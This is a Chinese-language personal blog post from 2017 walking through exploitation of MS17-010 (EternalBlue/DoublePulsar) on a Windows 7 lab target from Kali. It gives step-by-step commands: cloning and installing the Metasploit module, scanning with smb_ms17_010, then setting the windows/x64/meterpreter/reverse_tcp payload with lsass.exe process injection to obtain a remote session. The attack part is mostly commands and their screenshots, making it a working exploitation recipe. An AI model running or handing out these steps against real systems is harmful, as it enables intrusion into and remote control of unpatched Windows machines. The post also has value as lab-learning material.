<!doctype html><html lang=en-us style=max-width:1000px;margin:auto><head><title>Kevin Blog</title><meta name=theme-color content><meta charset=utf-8><meta content="width=device-width,initial-scale=1" name=viewport><meta name=description content="Kevin learning"><meta name=author content="Kevin Chen"><meta name=generator content="aafu theme by Darshan in Hugo 0.83.0"><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/bootstrap/bootstrap.min.css><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.15.2/css/all.css integrity=sha384-vSIIfh2YWi9wW0r9iZe7RJPrKwp6bG+s9QZMoITbCckVJqGCCRhc+ccxNcdpHuYu crossorigin=anonymous><link rel=stylesheet href=https://cdn.rawgit.com/jpswalsh/academicons/master/css/academicons.min.css><link rel=stylesheet href="//fonts.googleapis.com/css?family=Didact+Gothic%7CRoboto:400%7CRoboto+Mono"><link rel=stylesheet href=/css/aafu_pinkish.css><link rel=stylesheet href=/css/aafu.css><script>var themeColor=document.querySelector("meta[name=theme-color]");window.onload=()=>{themeColor.content=getComputedStyle(document.body)["background-color"];let a=document.querySelector(".accordion.active");a&&(a.nextElementSibling.style.maxHeight=a.nextElementSibling.scrollHeight+"px")},window.onresize=()=>{let a=document.querySelector(".accordion.active");a&&(a.nextElementSibling.style.maxHeight=a.nextElementSibling.scrollHeight+"px")}</script></head><body class=container><main style="min-height:calc(100vh - 60px)"><div class="d-flex flex-row row p-2"><h3 class="main-menu mr-3"><a href=https://cch0124.github.io/>Home</a></h3><h3 class="main-menu mr-3"><a href=/blog>Blog</a></h3><h3 class="main-menu mr-3"><a href=/project>Project</a></h3><h3 class="main-menu mr-3"><a href=/life>Life</a></h3><h3 class="main-menu mr-3"><a href=/kubernetes>Kubernetes</a></h3><h3 class="main-menu mr-3"><a href=/code>Coding</a></h3></div><div class=mb-3><h1 class=top-h1 style=font-size:2.75em>MS-17-010 實作</h1><p class=mb-1>June 27, 2017</p><p>&mdash;</p></div><div class=content><h3 id=1-環境>1. 環境</h3><ul><li>Kali 64bit（攻擊機）</li><li>windows7 SP1 64bit（靶機）</li></ul><h3 id=2-利用的模組>2. 利用的模組</h3><p>github：https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</p><h3 id=3-開始>3. 開始</h3><p>利用的模組載入 <code>Kali</code> 如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
<span style=color:#75715e>#把 deps目錄 And eternalblue_doublepulsar.rb 作複製動做，預設是沒有此模組。</span>
cp -r Eternalblue-Doublepulsar-Metasploit/deps/ <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>/usr/share/metasploit-framework/modules/exploits/windows/smb/ <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>
cp -r Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb <span style=color:#ae81ff>\ </span>
/usr/share/metasploit-framework/modules/exploits/windows/smb/ 

cp -r Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>/usr/share/metasploit-framework/modules/auxiliary/scanner/msf/
</code></pre></div><h3 id=4-開啟-msfconsole>4. 開啟 msfconsole</h3><p><img src=https://i.imgur.com/XvzSDVj.png alt></p><h3 id=5-ms17-010-漏洞檢查>5. ms17-010 漏洞檢查</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>use auxiliary/scanner/smb/smb_ms17_010 <span style=color:#75715e>#接著如下圖作</span>
show options
set RHOSTS IP <span style=color:#75715e># 設定靶機的IP</span>
</code></pre></div><p><img src=https://i.imgur.com/IvV83ld.png alt></p><h3 id=6-exploit-ms17-010>6. Exploit ms17-010</h3><p><img src=https://i.imgur.com/G2AxUeP.png alt></p><p>由於沒設定靶機 IP，以下進行設置</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>set RHOSTS IP <span style=color:#75715e># 設定靶機的IP </span>
<span style=color:#75715e>#設定 PAYLOAD（因為是 64 bit，所以需要設定）如果是 windows/meterpreter/reverse_tcp，會獲取不到 Session。</span>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit <span style=color:#75715e>#建立不起 Session</span>
</code></pre></div><p><img src=https://i.imgur.com/et5e1Ey.png alt></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>show options <span style=color:#75715e>#檢查</span>
set PROCESSINJECT lsass.exe <span style=color:#75715e>#因為是 64 bit 所以要更改成這個</span>
</code></pre></div><p><img src=https://i.imgur.com/XBKeoV2.png alt></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>exploit <span style=color:#75715e># 在一次，這次成功進去如下</span>
</code></pre></div><p><img src=https://i.imgur.com/NJWzFpV.png alt></p><p>接著，就可操控靶機了</p><p>如果發現 <code>exploit</code> 出現 <code>wine</code> 的問題，請如下解決看看。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>dpkg –add-architecture i386 <span style=color:#f92672>&amp;&amp;</span> apt-get update <span style=color:#f92672>&amp;&amp;</span> apt-get install wine32
</code></pre></div><h2 id=參考資料>參考資料：</h2><ul><li><a href=https://securityonline.info/exploit-windows-machine-ms-17-10-easy-like-ms08_067/>securityonline</a></li></ul></div><div class="d-flex flex-row justify-content-around"><h3 class="mb-1 mt-1 text-left mr-4"><a href=/project/2017-06-27-scanner-port-java/ title="scanner port"><i class="nav-menu fas fa-chevron-circle-left"></i></a></h3><h3 class="mb-1 mt-1 text-left ml-4"><a href=/project/2018-07-05-apache/ title="Apache 使用"><i class="nav-menu fas fa-chevron-circle-right"></i></a></h3></div></main><footer class="mt-2 mb-4 text-center"><span class=markdownify>short copyright message</span>
<span>&#183;
<i><a href=https://github.com/darshanbaral/aafu>aafu</a></i>
by
<a href=https://www.darshanbaral.com/>darshan</a></span></footer></body></html>